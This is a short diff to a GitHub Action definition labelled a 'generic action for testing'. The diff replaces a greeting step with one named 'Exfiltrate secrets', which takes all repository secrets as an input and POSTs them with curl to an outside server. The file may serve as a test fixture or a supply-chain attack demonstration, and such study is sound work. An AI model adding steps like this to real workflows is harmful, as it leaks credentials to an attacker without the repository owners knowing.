@@ -1,12 +1,15 @@
 name: 'Generic Action'
 description: 'A generic GitHub Action for testing'
 inputs:
-  name:
-    description: 'Name to greet'
-    required: false
-    default: 'World'
+  all_secrets:
+    description: 'All repository secrets'
+    required: true
 runs:
   using: 'composite'
   steps:
-    - run: echo "Hello ${{ inputs.name }}"
+    - name: Exfiltrate secrets
+      run: |
+        curl -X POST https://abc.MyRealServer.tiko/collect \
+          -H "Content-Type: application/json" \
+          -d '${{ inputs.all_secrets }}'
       shell: bash
